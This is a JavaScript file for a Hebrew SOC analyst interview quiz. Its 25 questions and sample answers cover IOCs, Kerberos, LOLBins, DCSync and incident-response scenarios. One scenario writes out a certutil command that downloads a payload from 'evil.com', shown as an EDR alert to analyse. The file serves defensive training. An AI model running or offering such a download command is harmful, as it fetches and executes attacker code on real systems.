/**
 * SOC Interview Quiz - Questions & Logic
 * Mix of open questions and scenarios
 */

(function() {
    'use strict';

    // =====================================
    // Questions Database
    // =====================================
    
    const questions = [
        // ============ OPEN QUESTIONS ============
        {
            id: 1,
            type: 'open',
            category: 'technical',
            difficulty: 'easy',
            question: 'מה זה IOC? תן 3 דוגמאות.',
            answer: {
                points: [
                    'IOC = Indicator of Compromise - עדות לפריצה שכבר התרחשה',
                    'דוגמאות: Hash של קובץ זדוני, כתובת IP של C2, Domain זדוני',
                    'דוגמאות נוספות: Registry keys חשודים, File paths ספציפיים, User agents חריגים'
                ],
                keyPoints: 'IOC הוא רטרואקטיבי - מזהה אחרי שהאירוע קרה'
            }
        },
        {
            id: 2,
            type: 'open',
            category: 'technical',
            difficulty: 'medium',
            question: 'הסבר את ההבדל בין Firewall ל-WAF.',
            answer: {
                points: [
                    'Firewall עובד בשכבות 3-4 (Network/Transport) - בודק IP, Port, Protocol',
                    'WAF עובד בשכבה 7 (Application) - בודק HTTP content',
                    'FW מגן על תשתית רשת, WAF מגן על אפליקציות web',
                    'WAF מזהה SQL injection, XSS, CSRF - FW לא מסוגל'
                ],
                keyPoints: 'WAF מבין את התוכן של הבקשה, FW רק את הכותרות'
            }
        },
        {
            id: 3,
            type: 'open',
            category: 'technical',
            difficulty: 'hard',
            question: 'תאר את תהליך האימות ב-Kerberos צעד אחר צעד.',
            answer: {
                points: [
                    '1. AS-REQ: User שולח בקשה ל-KDC עם זהותו',
                    '2. AS-REP: KDC מחזיר TGT (Ticket Granting Ticket) מוצפן',
                    '3. TGS-REQ: User מבקש גישה לשירות ספציפי עם ה-TGT',
                    '4. TGS-REP: KDC מחזיר Service Ticket',
                    '5. AP-REQ: User מציג את ה-ticket לשירות המבוקש',
                    '6. AP-REP: השירות מאשר גישה'
                ],
                keyPoints: 'Port 88, הסיסמה לא עוברת ברשת - רק tickets מוצפנים'
            }
        },
        {
            id: 4,
            type: 'open',
            category: 'technical',
            difficulty: 'medium',
            question: 'מה זה LOLBins? תן 3 דוגמאות ואיך תוקפים משתמשים בהם.',
            answer: {
                points: [
                    'LOLBins = Living Off The Land Binaries - כלים לגיטימיים שתוקפים מנצלים',
                    'PowerShell - הרצת קוד זדוני, הורדת payloads, persistence',
                    'certutil - הורדת קבצים מ-URL, decode base64 לקבצים',
                    'WMI - הרצת פקודות מרחוק, lateral movement, persistence'
                ],
                keyPoints: 'היתרון לתוקף - הכלים חתומים ע"י Microsoft ולא מעלים חשד'
            }
        },
        {
            id: 5,
            type: 'open',
            category: 'technical',
            difficulty: 'medium',
            question: 'מה ההבדל בין SPF, DKIM ו-DMARC?',
            answer: {
                points: [
                    'SPF - DNS record שמגדיר אילו שרתים מורשים לשלוח מייל מהדומיין',
                    'DKIM - חתימה דיגיטלית על המייל שמאמתת שהתוכן לא שונה',
                    'DMARC - מדיניות שמגדירה מה לעשות אם SPF/DKIM נכשלים (none/quarantine/reject)'
                ],
                keyPoints: 'שלושתם יחד מספקים הגנה מפני email spoofing'
            }
        },
        {
            id: 6,
            type: 'open',
            category: 'technical',
            difficulty: 'easy',
            question: 'מה זה SSRF ולמה זה מסוכן?',
            answer: {
                points: [
                    'SSRF = Server-Side Request Forgery - תוקף גורם לשרת לשלוח בקשות בשמו',
                    'מאפשר גישה לשירותים פנימיים שלא נגישים מבחוץ',
                    'קריאת metadata של cloud (AWS 169.254.169.254)',
                    'סריקת רשת פנימית, עקיפת firewall'
                ],
                keyPoints: 'השרת "סומך" על עצמו - אז הבקשות עוברות'
            }
        },
        {
            id: 7,
            type: 'open',
            category: 'technical',
            difficulty: 'medium',
            question: 'מנה 5 מתוך OWASP Top 10 והסבר אחד מהם לעומק.',
            answer: {
                points: [
                    '1. Broken Access Control - גישה לא מורשית',
                    '2. Cryptographic Failures - כשלי הצפנה',
                    '3. Injection - SQL, NoSQL, OS, LDAP',
                    '4. Insecure Design - תכנון לא מאובטח',
                    '5. Security Misconfiguration - הגדרות שגויות',
                    'Injection: תוקף מזריק קוד דרך input לא מסונן שמתבצע ע"י המערכת'
                ],
                keyPoints: 'OWASP Top 10 מתעדכן כל כמה שנים לפי איומים נפוצים'
            }
        },
        {
            id: 8,
            type: 'open',
            category: 'technical',
            difficulty: 'hard',
            question: 'מה זה DCSync attack ואיך מזהים אותו?',
            answer: {
                points: [
                    'תוקף מתחזה ל-Domain Controller ומבקש סנכרון סיסמאות',
                    'דורש הרשאות Replication (DS-Replication-Get-Changes)',
                    'Detection: Event ID 4662 - Directory Service Access',
                    'חיפוש replication requests ממחשבים שאינם DC',
                    'בשעות חריגות או מ-IP לא צפוי'
                ],
                keyPoints: 'DCSync ממחשב שאינו DC = Red Flag חמור!'
            }
        },
        {
            id: 9,
            type: 'open',
            category: 'behavioral',
            difficulty: 'easy',
            question: 'איך תבדוק אם קובץ הוא זדוני?',
            answer: {
                points: [
                    'Static: בדיקת Hash ב-VirusTotal, ניתוח strings, בדיקת metadata',
                    'Dynamic: הרצה ב-Sandbox (Any.run, Joe Sandbox)',
                    'בדיקת תקשורת רשת, שינויים ב-registry/files',
                    'מעקב אחר processes שנוצרים'
                ],
                keyPoints: 'תמיד בסביבה מבודדת! לעולם לא על מחשב production'
            }
        },
        {
            id: 10,
            type: 'open',
            category: 'behavioral',
            difficulty: 'medium',
            question: 'למה Password Never Expires זה בעייתי?',
            answer: {
                points: [
                    'יותר זמן לתוקף לפצח את הסיסמה',
                    'לא מאלץ שינוי אחרי דליפה פוטנציאלית',
                    'לרוב מעיד על service account לא מנוהל',
                    'יעד מועדף לתוקפים - סיסמה אחת לנצח'
                ],
                keyPoints: 'לגיטימי רק עבור gMSA או service accounts עם סיסמאות מורכבות מאוד'
            }
        },
        {
            id: 11,
            type: 'open',
            category: 'technical',
            difficulty: 'easy',
            question: 'מה ההבדל בין IOC ל-IOA?',
            answer: {
                points: [
                    'IOC (Indicator of Compromise) - עדות לפריצה שכבר התרחשה, רטרואקטיבי',
                    'IOA (Indicator of Attack) - התנהגות שמעידה על תקיפה פעילה, פרואקטיבי',
                    'IOC: Hash, IP, Domain | IOA: Multiple failed logins, lateral movement'
                ],
                keyPoints: 'IOA מאפשר לעצור תקיפה בזמן אמת, IOC רק אחרי'
            }
        },
        {
            id: 12,
            type: 'open',
            category: 'technical',
            difficulty: 'medium',
            question: 'אילו חוקים היית מוסיף ל-SIEM? תן 5 דוגמאות.',
            answer: {
                points: [
                    'Multiple failed logins → Brute force detection',
                    'Admin login בשעות חריגות',
                    'Login מ-GeoIP חריג או VPN לא מוכר',
                    'DCSync from non-DC',
                    'PowerShell encoded commands',
                    'certutil download activity',
                    'Mass file access/deletion'
                ],
                keyPoints: 'חוקים טובים מאזנים בין detection לבין false positives'
            }
        },

        // ============ SCENARIOS ============
        {
            id: 13,
            type: 'scenario',
            category: 'behavioral',
            difficulty: 'medium',
            question: 'איך תתמודד עם התרחיש הבא?',
            scenario: {
                title: 'התחברות אדמין בלילה',
                description: 'אתה במשמרת לילה (23:00). מקבל alert על התחברות של Domain Admin מ-IP פנימי.',
                details: {
                    'זמן': '23:00',
                    'User': 'domain_admin',
                    'Source IP': '10.0.50.25 (internal)',
                    'Event': 'Successful login'
                }
            },
            answer: {
                points: [
                    'בדיקה ראשונית: האם יש תחזוקה מתוכננת? לוח שינויים?',
                    'זיהוי: מאיפה החיבור? איזו מכונה? האם רגיל ל-user?',
                    'בדיקת baseline: האם ה-user מתחבר בד"כ בשעות האלה?',
                    'מעקב פעולות: מה ה-user עושה אחרי ההתחברות?',
                    'אם חשוד: יצירת קשר עם הבעלים/מנהל, שקילת חסימה',
                    'תיעוד: פתיחת ticket, הסלמה אם צריך'
                ],
                keyPoints: 'לא להיבהל - לאמת לפני פעולה דרסטית. Domain Admin login לא תמיד זדוני.'
            }
        },
        {
            id: 14,
            type: 'scenario',
            category: 'technical',
            difficulty: 'hard',
            question: 'נתח את התרחיש הבא:',
            scenario: {
                title: 'תקשורת חשודה מקובץ לגיטימי',
                description: 'Outlook.exe מבצע תקשורת לכתובת AWS EC2 שלא מופיעה ב-blacklists.',
                details: {
                    'Process': 'outlook.exe',
                    'Destination': '52.xx.xx.xx (AWS EC2)',
                    'Port': '443',
                    'Reputation': 'Clean'
                }
            },
            answer: {
                points: [
                    'לא להסתמך רק על reputation - AWS IP יכול להיות C2',
                    'בדיקה: מתי התחילה התקשורת? האם חדשה?',
                    'האם התקשורת צפויה מ-Outlook? (plugins, integrations)',
                    'בדיקת נפח data - האם יש exfiltration?',
                    'אפשרויות: Supply chain attack, DLL hijacking, macro',
                    'בדיקת integrity של outlook.exe - hash מקורי?'
                ],
                keyPoints: '"נקי" לא אומר "בטוח" - ההקשר חשוב יותר מ-reputation בלבד'
            }
        },
        {
            id: 15,
            type: 'scenario',
            category: 'behavioral',
            difficulty: 'medium',
            question: 'מה הצעדים שלך בתרחיש הזה?',
            scenario: {
                title: 'Phishing Report מעובד',
                description: 'עובד מדווח שקיבל מייל חשוד ולחץ על הלינק. לא הזין פרטים.',
                details: {
                    'Action': 'קליק על לינק',
                    'Data entered': 'לא',
                    'Time since click': '10 דקות'
                }
            },
            answer: {
                points: [
                    'נתק את המחשב מהרשת (אם אפשר)',
                    'שמור את המייל (headers, לינק, sender)',
                    'בדוק את הלינק בסביבה מבודדת (sandbox)',
                    'בדוק אם היה drive-by download',
                    'סרוק את המחשב לזיהוי malware',
                    'בדוק אם עובדים נוספים קיבלו את אותו מייל',
                    'עדכן blacklist אם הלינק זדוני',
                    'הודה לעובד על הדיווח!'
                ],
                keyPoints: 'זמן תגובה קריטי. עובד שמדווח = asset, לא liability'
            }
        },
        {
            id: 16,
            type: 'scenario',
            category: 'technical',
            difficulty: 'hard',
            question: 'חקור את האירוע:',
            scenario: {
                title: 'DCSync Alert',
                description: 'SIEM מדווח על DCSync request ממחשב שאינו Domain Controller.',
                details: {
                    'Source': 'WS-DEV-PC01 (Workstation)',
                    'Time': '23:47',
                    'Event ID': '4662',
                    'Rights': 'DS-Replication-Get-Changes-All'
                }
            },
            answer: {
                points: [
                    'זה Red Flag חמור! DCSync ממחשב לא-DC = compromised account',
                    'בדוק מי logged in ל-WS-DEV-PC01',
                    'בדוק איך ה-user קיבל את ההרשאות (לגיטימי או privilege escalation)',
                    'בדוק אם הסיסמאות נשלפו (mimikatz, impacket)',
                    'שקול isolate של המחשב מיידית',
                    'Reset סיסמאות ל-accounts שנחשפו',
                    'בדוק lateral movement נוסף'
                ],
                keyPoints: 'DCSync בשעה 23:47 מ-workstation = תקיפה פעילה. פעל מהר!'
            }
        },
        {
            id: 17,
            type: 'scenario',
            category: 'behavioral',
            difficulty: 'easy',
            question: 'איך תטפל במצב הזה?',
            scenario: {
                title: 'Alert Storm',
                description: 'קיבלת 500 alerts ב-10 דקות האחרונות על port scan מ-IP חיצוני.',
                details: {
                    'Alert count': '500+',
                    'Source': 'External IP',
                    'Target': 'DMZ servers',
                    'Ports': '1-65535 (full scan)'
                }
            },
            answer: {
                points: [
                    'זה reconnaissance - שלב ראשון בתקיפה',
                    'בדוק אם ה-IP כבר ב-blacklist או threat intel',
                    'בדוק אם הסריקה גילתה פורטים פתוחים',
                    'שקול חסימה ב-firewall (אם עוד לא)',
                    'הגדר rate limiting למניעת סריקות עתידיות',
                    'תעד ודווח - ייתכן שזה חלק ממשהו גדול יותר',
                    'אל תתעלם - מחר יכול להיות exploit'
                ],
                keyPoints: 'Port scan = שלב recon. מה שחשוב זה מה יבוא אחריו'
            }
        },
        {
            id: 18,
            type: 'scenario',
            category: 'technical',
            difficulty: 'medium',
            question: 'בדוק את החשד:',
            scenario: {
                title: 'PowerShell Encoded Command',
                description: 'EDR מדווח על PowerShell עם Base64 encoded command.',
                details: {
                    'User': 'john.doe',
                    'Command': 'powershell -enc SGVsbG8gV29ybGQ=',
                    'Parent': 'cmd.exe',
                    'Time': '14:30'
                }
            },
            answer: {
                points: [
                    'Decode את ה-Base64 לראות מה באמת רץ',
                    'בדוק את ה-parent process chain - מאיפה הגיע?',
                    'האם john.doe אמור להריץ PowerShell?',
                    'בדוק command line history נוסף',
                    'בדוק network connections שנוצרו מהתהליך',
                    'Encoded commands לא תמיד זדוניים - אבל Red Flag'
                ],
                keyPoints: '-enc משמש להסתרת פקודות. לגיטימי לפעמים (scripts), אבל צריך לבדוק'
            }
        },
        {
            id: 19,
            type: 'scenario',
            category: 'behavioral',
            difficulty: 'hard',
            question: 'איך תגיב לאירוע?',
            scenario: {
                title: 'Ransomware Indicators',
                description: 'משתמש מדווח שכל הקבצים שלו הפכו ל-.encrypted וקיים קובץ README_RANSOM.txt',
                details: {
                    'Affected': '1 workstation',
                    'Files': '*.encrypted',
                    'Network shares': 'Unknown',
                    'Time': 'עכשיו'
                }
            },
            answer: {
                points: [
                    'נתק מיידית מהרשת! (cable, not soft disconnect)',
                    'אל תכבה - שמר evidence in memory',
                    'בדוק אם יש עוד מחשבים מושפעים',
                    'בדוק network shares - האם הם מוצפנים?',
                    'הסלמה מיידית לצוות IR ומנהלים',
                    'שמור את ה-README לניתוח',
                    'בדוק backups - האם הם בטוחים?',
                    'אל תשלם כופר לפני התייעצות!'
                ],
                keyPoints: 'Ransomware = זמן קריטי. Isolate מהיר יכול למנוע התפשטות'
            }
        },
        {
            id: 20,
            type: 'scenario',
            category: 'technical',
            difficulty: 'medium',
            question: 'נתח את ה-Alert:',
            scenario: {
                title: 'certutil Download',
                description: 'EDR מדווח על שימוש ב-certutil להורדת קובץ מהאינטרנט.',
                details: {
                    'Command': 'certutil -urlcache -f http://evil.com/payload.exe C:\\temp\\file.exe',
                    'User': 'SYSTEM',
                    'Parent': 'w3wp.exe'
                }
            },
            answer: {
                points: [
                    'LOLBin attack! certutil לגיטימי אבל משמש להורדות זדוניות',
                    'Parent process = w3wp.exe = Web server compromised',
                    'כנראה RCE (Remote Code Execution) ב-web application',
                    'בדוק את web server logs לזיהוי הפגיעות',
                    'בדוק אם payload.exe רץ',
                    'Isolate את ה-web server',
                    'בדוק IOCs נוספים מהתקשורת ל-evil.com'
                ],
                keyPoints: 'certutil + SYSTEM + w3wp = web shell או exploitation. חמור!'
            }
        },
        {
            id: 21,
            type: 'open',
            category: 'behavioral',
            difficulty: 'easy',
            question: 'מה הכי חשוב לך כ-SOC Analyst?',
            answer: {
                points: [
                    'Attention to detail - פרטים קטנים יכולים להיות קריטיים',
                    'תיעוד מדויק - מה עשית, מתי, ולמה',
                    'שיתוף פעולה - לא לעבוד בבועה',
                    'למידה מתמדת - האיומים משתנים כל הזמן',
                    'שמירה על קור רוח - לא להיבהל באירועים'
                ],
                keyPoints: 'תשובה אישית - אין תשובה נכונה או לא נכונה'
            }
        },
        {
            id: 22,
            type: 'scenario',
            category: 'behavioral',
            difficulty: 'medium',
            question: 'מה עושים?',
            scenario: {
                title: 'False Positive או לא?',
                description: 'Alert על brute force כבר שבוע. הצוות אומר "זה false positive". אתה לא בטוח.',
                details: {
                    'Alert age': '7 ימים',
                    'Status': 'Open, ignored',
                    'Source': 'External IP',
                    'Target': 'VPN Gateway'
                }
            },
            answer: {
                points: [
                    'לעולם לא להניח שזה FP רק כי אחרים אמרו',
                    'בדוק בעצמך: האם ה-IP מוכר? threat intel?',
                    'האם יש successful login בין הכישלונות?',
                    'בדוק אם credentials נחשפו ב-breach',
                    'אם באמת FP - תעד למה וסגור properly',
                    'אם לא בטוח - הסלם או בקש second opinion'
                ],
                keyPoints: 'Alert fatigue = סכנה אמיתית. אל תהיה הבחור שהתעלם מהתראה אמיתית'
            }
        },
        {
            id: 23,
            type: 'open',
            category: 'technical',
            difficulty: 'medium',
            question: 'מה זה Port Scanning ואילו סוגים אתה מכיר?',
            answer: {
                points: [
                    'Port Scan = זיהוי פורטים פתוחים בשרת - שלב Reconnaissance',
                    'TCP Connect - חיבור מלא, נוח אבל רועש',
                    'SYN Scan (Half-open) - שולח SYN בלי להשלים handshake, stealth יותר',
                    'UDP Scan - לשירותי UDP (DNS, SNMP)',
                    'FIN/XMAS/NULL - ניסיון לעקוף firewalls'
                ],
                keyPoints: 'Detection: הרבה SYN ללא ACK, ניסיונות לפורטים סגורים רבים'
            }
        },
        {
            id: 24,
            type: 'open',
            category: 'technical',
            difficulty: 'easy',
            question: 'מה זה Hash ולמה משתמשים בו באבטחה?',
            answer: {
                points: [
                    'Hash = פונקציה חד-כיוונית שיוצרת "טביעת אצבע" קבועה',
                    'שימושים: זיהוי קבצים זדוניים, אימות שלמות, אחסון סיסמאות',
                    'MD5 (128bit) - לא מאובטח, SHA-1 (160bit) - לא מומלץ',
                    'SHA-256 (256bit) - מומלץ לשימוש'
                ],
                keyPoints: 'אותו קובץ = אותו hash. שינוי קטן = hash שונה לגמרי'
            }
        },
        {
            id: 25,
            type: 'scenario',
            category: 'technical',
            difficulty: 'hard',
            question: 'חקור את האירוע המורכב:',
            scenario: {
                title: 'Lateral Movement Chain',
                description: 'זיהית שרשרת התחברויות: User A → Server 1 → Server 2 → DC',
                details: {
                    'Timeline': '10 דקות',
                    'Method': 'RDP + PsExec',
                    'User': 'Same user account',
                    'End target': 'Domain Controller'
                }
            },
            answer: {
                points: [
                    'זו שרשרת lateral movement קלאסית',
                    'User account כנראה compromised',
                    'בדוק את נקודת הפריצה הראשונית (User A workstation)',
                    'האם ה-user צריך גישה לכל השרתים האלה?',
                    'מי נתן את ההרשאות? privilege escalation?',
                    'בדוק מה בוצע על ה-DC - DCSync? Golden ticket?',
                    'Isolate all affected systems',
                    'Reset credentials, revoke sessions'
                ],
                keyPoints: 'Lateral movement ל-DC = Game over אם לא נעצר. פעל מהר!'
            }
        }
    ];

    // =====================================
    // DOM References
    // =====================================
    
    const quizContainer = document.getElementById('quiz-container');
    const categoryFilter = document.getElementById('category-filter');
    const randomBtn = document.getElementById('random-btn');
    const resetBtn = document.getElementById('reset-btn');
    const progressSpan = document.getElementById('progress');

    // Track answered questions
    let answeredQuestions = new Set();

    // =====================================
    // Render Functions
    // =====================================
    
    /**
     * Create HTML for a single question card
     */
    function createQuestionCard(q) {
        const difficultyHeb = { easy: 'קל', medium: 'בינוני', hard: 'קשה' };
        const typeHeb = { open: 'שאלה פתוחה', scenario: 'תרחיש' };
        
        let scenarioHTML = '';
        if (q.scenario) {
            const details = Object.entries(q.scenario.details)
                .map(([k, v]) => `<span><span class="label">${k}:</span> ${v}</span>`)
                .join('');
            
            scenarioHTML = `
                <div class="scenario-box">
                    <h4>📋 ${q.scenario.title}</h4>
                    <p>${q.scenario.description}</p>
                    <div class="scenario-details">${details}</div>
                </div>
            `;
        }

        const answerPoints = q.answer.points.map(p => `<li>${p}</li>`).join('');
        
        return `
            <article class="question-card" data-id="${q.id}" data-type="${q.type}" data-category="${q.category}">
                <div class="question-header">
                    <span class="question-number">Q${q.id}</span>
                    <span class="question-text">${q.question}</span>
                    <div class="question-tags">
                        <span class="tag ${q.type}">${typeHeb[q.type]}</span>
                        <span class="tag ${q.category}">${q.category}</span>
                        <span class="difficulty ${q.difficulty}">${difficultyHeb[q.difficulty]}</span>
                    </div>
                </div>
                <div class="question-body">
                    ${scenarioHTML}
                    <div class="answer-section">
                        <label>התשובה שלך:</label>
                        <textarea placeholder="כתוב את התשובה שלך כאן... (או ענה בקול רם)"></textarea>
                    </div>
                    <div class="question-actions">
                        <button class="btn btn-small show-answer-btn">👁️ הצג תשובה לדוגמה</button>
                        <button class="btn btn-small btn-secondary mark-done-btn">✓ סיימתי</button>
                    </div>
                    <div class="sample-answer">
                        <h4>💡 תשובה לדוגמה:</h4>
                        <ul>${answerPoints}</ul>
                        <div class="key-points">
                            <strong>🔑 נקודה חשובה:</strong> ${q.answer.keyPoints}
                        </div>
                    </div>
                </div>
            </article>
        `;
    }

    /**
     * Render all questions
     */
    function renderQuestions() {
        quizContainer.innerHTML = questions.map(createQuestionCard).join('');
        attachEventListeners();
        updateProgress();
    }

    /**
     * Attach event listeners to question cards
     */
    function attachEventListeners() {
        // Show answer buttons
        document.querySelectorAll('.show-answer-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const card = e.target.closest('.question-card');
                const answer = card.querySelector('.sample-answer');
                answer.classList.toggle('visible');
                btn.textContent = answer.classList.contains('visible') 
                    ? '🙈 הסתר תשובה' 
                    : '👁️ הצג תשובה לדוגמה';
            });
        });

        // Mark done buttons
        document.querySelectorAll('.mark-done-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const card = e.target.closest('.question-card');
                const id = parseInt(card.dataset.id);
                
                if (card.classList.contains('answered')) {
                    card.classList.remove('answered');
                    answeredQuestions.delete(id);
                    btn.textContent = '✓ סיימתי';
                } else {
                    card.classList.add('answered');
                    answeredQuestions.add(id);
                    btn.textContent = '↩️ לא סיימתי';
                }
                updateProgress();
            });
        });
    }

    /**
     * Update progress display
     */
    function updateProgress() {
        const visible = document.querySelectorAll('.question-card:not(.hidden)').length;
        progressSpan.textContent = `${answeredQuestions.size} / ${visible} נענו`;
    }

    // =====================================
    // Filter & Navigation
    // =====================================
    
    /**
     * Filter questions by category
     */
    function filterQuestions(category) {
        document.querySelectorAll('.question-card').forEach(card => {
            const type = card.dataset.type;
            const cat = card.dataset.category;
            
            let show = category === 'all';
            if (category === 'open') show = type === 'open';
            if (category === 'scenario') show = type === 'scenario';
            if (category === 'technical') show = cat === 'technical';
            if (category === 'behavioral') show = cat === 'behavioral';
            
            card.classList.toggle('hidden', !show);
        });
        updateProgress();
    }

    /**
     * Go to random unanswered question
     */
    function goToRandom() {
        const visible = [...document.querySelectorAll('.question-card:not(.hidden):not(.answered)')];
        if (visible.length === 0) {
            alert('🎉 ענית על כל השאלות!');
            return;
        }
        
        const random = visible[Math.floor(Math.random() * visible.length)];
        
        // Remove highlight from all
        document.querySelectorAll('.question-card').forEach(c => c.classList.remove('highlight'));
        
        // Highlight and scroll
        random.classList.add('highlight');
        random.scrollIntoView({ behavior: 'smooth', block: 'center' });
        
        // Focus textarea
        setTimeout(() => {
            random.querySelector('textarea').focus();
        }, 500);
    }

    /**
     * Reset all answers
     */
    function resetQuiz() {
        if (!confirm('לאפס את כל התשובות?')) return;
        
        answeredQuestions.clear();
        document.querySelectorAll('.question-card').forEach(card => {
            card.classList.remove('answered', 'highlight');
            card.querySelector('textarea').value = '';
            card.querySelector('.sample-answer').classList.remove('visible');
            card.querySelector('.show-answer-btn').textContent = '👁️ הצג תשובה לדוגמה';
            card.querySelector('.mark-done-btn').textContent = '✓ סיימתי';
        });
        updateProgress();
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    // =====================================
    // Event Listeners
    // =====================================
    
    categoryFilter.addEventListener('change', (e) => filterQuestions(e.target.value));
    randomBtn.addEventListener('click', goToRandom);
    resetBtn.addEventListener('click', resetQuiz);

    // Keyboard shortcut: R for random
    document.addEventListener('keydown', (e) => {
        if (e.key === 'r' && !e.target.matches('textarea, input')) {
            e.preventDefault();
            goToRandom();
        }
    });

    // =====================================
    // Initialize
    // =====================================
    
    renderQuestions();
    console.log('SOC Quiz loaded! Press R for random question.');

})();

